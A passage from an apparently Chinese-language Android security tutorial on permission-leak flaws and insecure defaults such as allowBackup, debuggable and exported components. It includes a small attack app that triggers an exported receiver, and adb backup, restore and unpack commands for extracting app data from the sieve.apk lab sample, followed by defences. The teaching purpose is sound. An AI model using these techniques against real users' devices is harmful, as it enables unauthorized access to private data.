class="attr">android:permissionGroup</span>=<span class="string">&quot;android.permission-group.COST_MONEY&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:protectionLevel</span>=<span class="string">&quot;dangerous&quot;</span> /&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">属性说明：</span><br><span class="line">(<span class="number">1</span>)name：自定义权限的名字，其他app引用的名字</span><br><span class="line">(<span class="number">2</span>)lable：标签，用于描述该权限保护的关键功能,显示给用户的，它的值可是一个 string 数据</span><br><span class="line">(<span class="number">3</span>)description：描述，比 label 更长的对权限的描述。值是通过 resource 文件中获取的，不能直接写 string 值。</span><br><span class="line">(<span class="number">4</span>)permissionGroup：权限组，可选属性。在大多数情况下，应该将其设置为一个标准系统组（android.Manifest.permission_group），尽管可以自己定义一个组。</span><br><span class="line">(<span class="number">5</span>)protectionLevel：权限的等级，必须的属性</span><br></pre></td></tr></table></figure>
+
+<h5 id="lt-2-gt-自定义权限使用"><a href="#lt-2-gt-自定义权限使用" class="headerlink" title="&lt;2&gt;自定义权限使用"></a>&lt;2&gt;自定义权限使用</h5><p>我们先在进程1中定义自定义权限：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;manifest xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="line">    <span class="keyword">package</span>=<span class="string">&quot;com.example.test&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//自定义的权限，权限级别为 normal</span></span><br><span class="line">    &lt;permission</span><br><span class="line">        android:name=<span class="string">&quot;com.example.test.permission.SECOND_ACTIVITY&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;abc&quot;</span></span><br><span class="line">        android:description=<span class="string">&quot;@string/permdesc_SecondActivity&quot;</span></span><br><span class="line">        android:permissionGroup=<span class="string">&quot;android.permission-group.COST_MONEY&quot;</span></span><br><span class="line">        android:protectionLevel=<span class="string">&quot;normal&quot;</span> /&gt;</span><br><span class="line">            &lt;application</span><br><span class="line">        android:allowBackup=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;@string/app_name&quot;</span></span><br><span class="line">        android:roundIcon=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span><br><span class="line">        android:supportsRtl=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:theme=<span class="string">&quot;@style/AppTheme&quot;</span>&gt;</span><br><span class="line">        <span class="comment">//为SecondActivity加上android:permission=&quot;com.example.myapp.permission.SECOND_ACTIVITY&quot;</span></span><br><span class="line">        &lt;activity</span><br><span class="line">            android:name=<span class="string">&quot;.SecondActivity&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;true&quot;</span></span><br><span class="line">            android:permission=<span class="string">&quot;com.example.test.permission.SECOND_ACTIVITY&quot;</span>&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">&quot;com.example.jump&quot;</span> /&gt;</span><br><span class="line">                &lt;category android:name=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">		......</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们在进程2中声明该自定义权限：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.test&quot;</span>&gt;</span></span><br><span class="line">	//在AndroidManifest中声明权限</span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.test.permission.SECOND_ACTIVITY&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在进程2的MainActivity中编写代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.example.jump&quot;</span>);</span><br><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class="line"><span class="keyword">if</span> (intent.resolveActivity(getPackageManager()) != <span class="literal">null</span>) &#123;</span><br><span class="line">	startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就可以顺利从进程2跳转到进程1</p>
+<h5 id="lt-3-gt-自定义权限注意点"><a href="#lt-3-gt-自定义权限注意点" class="headerlink" title="&lt;3&gt;自定义权限注意点"></a>&lt;3&gt;自定义权限注意点</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）两个应用声明了相同的权限？</span><br><span class="line">Android不允许两个不同的应用定义一个相同名字的权限（除非这两个应用拥有相同签名），所以最好不要命名相同</span><br><span class="line">（<span class="number">2</span>）应用安装的顺序关系</span><br><span class="line">场景：APP A中声明了权限permission A，APP B中使用了权限permissionA</span><br><span class="line">情况<span class="number">1</span>：PermissionA的保护级别是normal或者dangerous，只能App A先安装，App B后安装，从App B打开App A一切正常，否则报错</span><br><span class="line">情况<span class="number">2</span>：PermissionA的保护级别是signature或者signatureOrSystem</span><br><span class="line">      App B先安装，App A后安装，如果App A和App B是相同的签名，那么App B可以获取到PermissionA的权限</span><br><span class="line">      如果App A和App B的签名不同，则App B获取不到PermissionA权限</span><br><span class="line">      对于相同签名的app来说，不论安装先后，只要是声明了权限，请求该权限的app就会获得该权限</span><br><span class="line">情况<span class="number">3</span>:android:protectionLevel会影响权限在Android6<span class="number">.0</span>+系统的使用</span><br><span class="line">	 android:protectionLevel=<span class="string">&quot;normal&quot;</span>，不需要动态申请 </span><br><span class="line">	 android:protectionLevel=<span class="string">&quot;dangerous&quot;</span>，需要动态申请</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-权限安全种类和危害"><a href="#2-权限安全种类和危害" class="headerlink" title="2.权限安全种类和危害"></a>2.权限安全种类和危害</h3><p><strong>权限漏洞种类：</strong></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/3.png" alt="image-20211026104832302"></p>
+<p><strong>安全场景：</strong></p>
+<p>我们通过上面的分析，可以发现大部分权限安全的场景都发生在保护级别设置不当，自定义权限中如果权限控制不当，往往就会导致各种越权等安全问题的发生。我们再次看一下自定义权限的结构：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:permissionGroup</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:protectionLevel</span>=<span class="string">[</span>&quot;<span class="attr">normal</span>&quot;|&quot;<span class="attr">dangerous</span>&quot;|&quot;<span class="attr">signature</span>&quot;|&quot;<span class="attr">signatureOrSystem</span>&quot; /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Normal:最低等级，系统会默认授予次权限，不会提示用户，低风险，所以的APP不能访问和共享此APP</span><br><span class="line">Dangerous:系统在安装时声明此类权限的app会提示用户，是高风险，所以APP都能访问和共享此APP</span><br><span class="line">Signature:权限表明的操作只针对使用同一个证书签名的app开放，是指具有相同签名的APP可以访问和共享此APP</span><br><span class="line">SignatureOrSystem:系统images中APP和具有相同签名的APP可以访问和共享此APP,google建议不使用该选项，一般用于特定的一些功能</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、权限安全漏洞原理分析和复现"><a href="#三、权限安全漏洞原理分析和复现" class="headerlink" title="三、权限安全漏洞原理分析和复现"></a>三、权限安全漏洞原理分析和复现</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><p>介绍权限漏洞之前，我们先讲解一下Android组件基本知识，前几篇帖子我们也介绍过，Android程序运行在独立的沙箱环境中，相互隔离，为了方便通信，Android提供了组件间的通信（ICC）机制，允许满足条件的组件相互传递数据，ICC的实现依赖于Intent和Binder机制，其底层是通过进程间通信来实现的。在组件的通信过程中，Intent是数据传播的载体，通信发起方发送Intent，携带执行的动作、动作相关的数据和附加数据等信息，通信接收方预先定义自身的Intent-filter，intent-filter中包含能够响应intent的动作和数据类型，声明能够响应的intent请求，应用程序框架在通信发起Intent后，负责找到能处理该Intent的接收方。</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/4.png" alt="image-20211026112045142"></p>
+<p>组件间通信的一个前提是接收方组件必须公开，Android中的组件分为公开组件和私有组件，具体有export是否可导出决定，而Android权限泄漏漏洞就是由于不合理的公开了组件或者没有对接收的Intent进行合法性校验导致，其表现为将一个拥有权限的API通过公开组件暴露给外界，攻击者可以构造数据访问这个API达到权限提升的效果，一般表现为两个方面：隐私获取和动作执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">隐私获取：指的是攻击者通过构造数据访问存在权限泄露漏洞的程序组件，并让该组件返回隐私数据，这些数据包括短信消息、联系人信息、地理位置、邮件信息等等</span><br><span class="line">动作执行：指的是攻击者构造数据访问存在权限泄露的程序组件，让该组件执行系统破坏等恶意的操作，例如结束系统服务、拨打电话、删除程序数据等</span><br></pre></td></tr></table></figure>
+
+<p>具体的示意图如下所示：</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/5.png" alt="image-20211026112525986"></p>
+<p>应用程序B是一个拥有权限P1的应用程序，包含组件C1，C1组件是公开给外界，意为export &#x3D; true，并且C1组件可以访问权限P1对应的系统资源，这样另外一个没有权限P1的应用程序A，可以构造Intent数据去启动应用程序B的C1组件，进而访问到P1权限对应的系统资源，拥有权限P1的应用程序B没有对权限合理的保护，引发了权限泄漏，没有权限P1的应用程序A利用这个漏洞获得了权限，导致了权限泄漏</p>
+<h3 id="2-漏洞案例"><a href="#2-漏洞案例" class="headerlink" title="2.漏洞案例"></a>2.漏洞案例</h3><h4 id="（1）下载文件权限泄漏漏洞"><a href="#（1）下载文件权限泄漏漏洞" class="headerlink" title="（1）下载文件权限泄漏漏洞"></a>（1）下载文件权限泄漏漏洞</h4><p><strong>目标程序：</strong></p>
+<p>配置文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">&lt;!--网络--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 读写文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.Download&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.down&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码段：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Download</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> This method is called when the BroadcastReceiver is receiving</span></span><br><span class="line">        <span class="comment">// an Intent broadcast.</span></span><br><span class="line">        <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;com.example.down&quot;</span>))&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> intent.getExtras().getString(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> intent.getExtras().getString(<span class="string">&quot;fileName&quot;</span>);</span><br><span class="line">            Toast.makeText(context,<span class="string">&quot;Downlaod start!&quot;</span>+url+<span class="string">&quot;---&quot;</span>+fileName,Toast.LENGTH_LONG).show();</span><br><span class="line">            Log.i(<span class="string">&quot;test&quot;</span>,url+fileName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//throw new UnsupportedOperationException(&quot;Not yet implemented&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击程序：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(<span class="string">&quot;com.example.down&quot;</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;url&quot;</span>,<span class="string">&quot;https://www.baidu.com/&quot;</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;filename&quot;</span>,<span class="string">&quot;baidu&quot;</span>);</span><br><span class="line">        sendBroadcast(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>效果显示：</strong></p>
+<p>测试样例：</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/6.png" alt="image-20211026135228985"></p>
+<p>攻击样例：</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/7.png" alt="image-20211026135354598"></p>
+<p>我们可以很明显发现，我们可以通过进程B发送广播到进程A，从而调用进程A的下载功能，开始下载</p>
+<h4 id="（2）猎豹清理大师内存清理权限泄漏漏洞"><a href="#（2）猎豹清理大师内存清理权限泄漏漏洞" class="headerlink" title="（2）猎豹清理大师内存清理权限泄漏漏洞"></a>（2）猎豹清理大师内存清理权限泄漏漏洞</h4><p>这个案例是一个很早之前的漏洞，现在参考意义不大，不过大家可以借助其学习其原理即可</p>
+<p><strong>漏洞描述：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Android应用程序猎豹清理大师存在自定义的权限android.permission.RESTART_PACKAGES，该权限主要用来结束进程来达到清理内存的目的，当其他没有申请此权限的app向目标程序发送相应的intent时，便可以结束后台运行的部分app进程</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞实现：</strong></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/8.png" alt="image-20211026140524902"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/9.png" alt="image-20211026140633874"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/10.png" alt="image-20211026140609720"></p>
+<p>这就是很典型的我们利用个人定义的权限，来攻击目标程序，达到权限泄漏漏洞的目标</p>
+<h3 id="3-漏洞防护"><a href="#3-漏洞防护" class="headerlink" title="3.漏洞防护"></a>3.漏洞防护</h3><h4 id="（1）组件设置不可导出"><a href="#（1）组件设置不可导出" class="headerlink" title="（1）组件设置不可导出"></a>（1）组件设置不可导出</h4><p>我们从上面的两个案例可以发现，Android的权限泄漏漏洞往往和四大组件相互关联，我们对一些重要组件设置不可导出，就可以达到一定的保护效果</p>
+<h4 id="（2）设置权限级别"><a href="#（2）设置权限级别" class="headerlink" title="（2）设置权限级别"></a>（2）设置权限级别</h4><p>我们可以对自定义的权限一定要设置相应的保护级别，从上文我们可以得出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android:protectionLevel=&quot;normal&quot;，不需要动态申请 </span><br><span class="line">android:protectionLevel=&quot;dangerous&quot;，需要动态申请</span><br><span class="line">android:protectionLevel=&quot;signature|signatureOrSystem&quot;,需要两个程序签名相同才能访问，这样就可以很好的避免权限泄漏的风险</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、Android默认设置介绍"><a href="#四、Android默认设置介绍" class="headerlink" title="四、Android默认设置介绍"></a>四、Android默认设置介绍</h2><p>在上文中已经向大家详细介绍了Android中的权限安全漏洞的情况，接下来我们进一步了解Android中的默认设置以及默认设置引起的安全问题，Android中的默认设置主要分为：AndroidManifest.xml配置文件和WebView的默认设置</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/11.png" alt="image-20211026144059511"></p>
+<h4 id="（1）AndroidManifest-xml默认设置"><a href="#（1）AndroidManifest-xml默认设置" class="headerlink" title="（1）AndroidManifest.xml默认设置"></a>（1）AndroidManifest.xml默认设置</h4><p>这里我总结了AndroidManifest.xml的基本结构图</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/12.png" alt="image-20211026144059511"></p>
+<p>这里我们主要关注allowBackup、Debuggable、组件默认导出</p>
+<h5 id="lt-1-gt-allowBackup"><a href="#lt-1-gt-allowBackup" class="headerlink" title="&lt;1&gt; allowBackup"></a>&lt;1&gt; allowBackup</h5><p>Android API Level 8及其以上Android系统提供了应用程序的备份和恢复功能，这是由AndroidManifest.xml文件中的<code>allowBackup</code>属性决定，allowBackup 标志为 true 时，用户即可通过 <code>adb backup</code> 和 <code>adb restore</code> 来进行对应用数据的备份和恢复</p>
+<p>Android 属性allowBackup 安全风险源于adb backup容许任何一个人能够打开USB调试开关，从Android手机中复制应用数据到外设，一旦数据被备份之后，所有应用数据都可被用户读取。<code>adb restore</code> 容许用户指定一个恢复的数据来源（即备份的应用数据）来恢复应用程序数据的创建</p>
+<p><strong>安全影响：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通讯录应用，一旦应用程序支持备份和恢复功能，攻击者即可通过 adb backup 和 adb restore 进行恢复新安装的同一个应用来查看聊天记录等信息</span><br><span class="line">支付金融类应用，攻击者可通过此来进行恶意支付、盗取存款等</span><br></pre></td></tr></table></figure>
+
+<p><strong>allowBackup安全风险详情：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.allowBackup 风险位置：AndroidMannifest.xml 文件 android:allowBackup 属性</span><br><span class="line">2.allowBackup 风险触发前提条件：未将 AndroidMannifest.xml 文件中的 android:allowBackup 属性值设为 false</span><br><span class="line">3.allowBackup 风险原理：当 allowBackup 标志值为 true 时，即可通过 adb backup 和 adb restore 来备份和恢复应用程序数据</span><br></pre></td></tr></table></figure>
+
+<p><strong>数据备份：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">命令：adb backup  [-system|nosystem] -all [-apk|-noapk] [-shared|-noshared] -f &lt;档案名称&gt;[需要备份的应用包名]</span><br><span class="line">    </span><br><span class="line">[-system|nosystem]</span><br><span class="line">这个指令告诉adb在备份时是否要连同系统一起备份，若没有打开的话，默认是-system表示会一起备份系统，若连系统一起备份，在还原时候会覆盖系统档案，这对已经升级的手机是非常不好的，-nosystem是建议要打上去的指令</span><br><span class="line"></span><br><span class="line">-all</span><br><span class="line">这个指令除非要备份单一App不然是一定要打上去的，表示是否备份全部的App，若有加上`-nosystem`，就只会备份你目前已经安装上去的App而不会连系统App一起备份</span><br><span class="line"></span><br><span class="line">[-apk|-noapk]</span><br><span class="line">默认是-noapk，这个参数的意思是，是否连安装的apk一起备份，若为-noapk，则只会备份apk的资料档</span><br><span class="line"></span><br><span class="line">[-shared|-noshared]</span><br><span class="line">默认是`-noshared`，表示是否连手机存储空间或是SD卡的档案一起备份</span><br><span class="line"></span><br><span class="line">-f</span><br><span class="line">用这个来选择备份文件存储在哪里，例如-f /backup/applock.ab将会使文件存储在根磁盘（Windows的C盘等等）下一个名为backup的文件夹里，并且备份文件名为applock.ab</span><br></pre></td></tr></table></figure>
+
+<p>例如我们直接备份</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb backup  -apk  -shared  -system  -all  -f  applock.ab</span><br></pre></td></tr></table></figure>
+
+<p>就会在电脑默认路径下产生applock.ab文件，大小与系统有关</p>
+<p><strong>查看数据：</strong></p>
+<p>一般我们使用abe工具来解析ab文件，工具参考网址：<a target="_blank" rel="noopener" href="https://github.com/nelenkov/android-backup-extractor/releases">abe工具</a></p>
+<p>解压命令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ade.jar unpack <span class="number">1.</span>ab <span class="number">1.</span>tar </span><br></pre></td></tr></table></figure>
+
+<p><strong>恢复数据：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb restore applock.ab</span><br></pre></td></tr></table></figure>
+
+<h5 id="lt-2-gt-debuggable"><a href="#lt-2-gt-debuggable" class="headerlink" title="&lt;2&gt; debuggable"></a>&lt;2&gt; debuggable</h5><p><code>android:debuggable</code>属性是指定应用程序是否能够被调试，即时是以用户模式运行在设备上的时候，如果设置为 true ，则能够被调试，否则不能调试，默认值是false</p>
+<p>逆向工作人员在对一个apk程序进行逆向时，第一步往往就是要对debuggable属性进行绕过，否则就不能进行正常的调试，因此如果属性本身设为true，更容易导致该应用存在动态调试，泄露数据信息的风险</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/13.png" alt="image-20211026164320202"></p>
+<h5 id="lt-3-gt-exported"><a href="#lt-3-gt-exported" class="headerlink" title="&lt;3&gt; exported"></a>&lt;3&gt; exported</h5><p>前几篇帖子，我们讲述四大组件过程中，经常会涉及到exported导出导致的漏洞，exported组件导出，会导致导出的组件被第三方APP任意调用，导致敏感信息，并可能受到绕过认证、恶意代码注入等风险，由于前面我们已经讲得很详细了，这里就不再做过多描述</p>
+<h4 id="（2）WebView默认设置"><a href="#（2）WebView默认设置" class="headerlink" title="（2）WebView默认设置"></a>（2）WebView默认设置</h4><p>WebView是android中用来展示网页的重要控件，Android中经常会使用WebView来实现Web页面的展示，在Activity中启动自己的浏览器或者简单的展示一些在线内容等，而WebView上的漏洞问题也各种各样，过去几年内WebView中被披露的重大漏洞包括了任意代码执行漏洞、跨域、密码明文保存等，后面我们将WebView作为一个专题讲述上面存在的漏洞问题，这里我们只关注WebView中默认设置的安全问题</p>
+<p>后面我们主要讲述WebView上几方面的默认设置漏洞</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/14.png" alt="image-20211026165646971"></p>
+<h2 id="五、Android默认设置漏洞原理分析和复现"><a href="#五、Android默认设置漏洞原理分析和复现" class="headerlink" title="五、Android默认设置漏洞原理分析和复现"></a>五、Android默认设置漏洞原理分析和复现</h2><h3 id="1-allowBackup"><a href="#1-allowBackup" class="headerlink" title="1. allowBackup"></a>1. allowBackup</h3><h4 id="（1）备份安全设置信息泄露漏洞"><a href="#（1）备份安全设置信息泄露漏洞" class="headerlink" title="（1）备份安全设置信息泄露漏洞"></a>（1）备份安全设置信息泄露漏洞</h4><p>上文我们已经详细的给大家讲述了<code>allowBackup</code>设置<code>true</code>的安全性，接下来我拿一个案例带大家深入了解：</p>
+<h5 id="lt-1-gt-漏洞复现"><a href="#lt-1-gt-漏洞复现" class="headerlink" title="&lt;1&gt; 漏洞复现"></a>&lt;1&gt; 漏洞复现</h5><p>样本：sieve.apk</p>
+<p><strong>信息设置：</strong></p>
+<p>首先，我们将样本安装到手机上，并打开主界面</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/15.png" alt="image-20211026194532102"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/16.png" alt="image-20211026194611643"></p>
+<p>进入主程序我们发现，提示我们注册密码，而且需要至少16位，这里我们输入密码<code>zxcvbnm0123456789</code></p>
+<p>进入后，又要我们输入PIN码，我们输入<code>1234</code></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/18.png" alt="image-20211026195015970"></p>
+<p>然后我们发现需要再次输入密码才能进入，我们再次输入密码</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/19.png" alt="image-20211026195112662"></p>
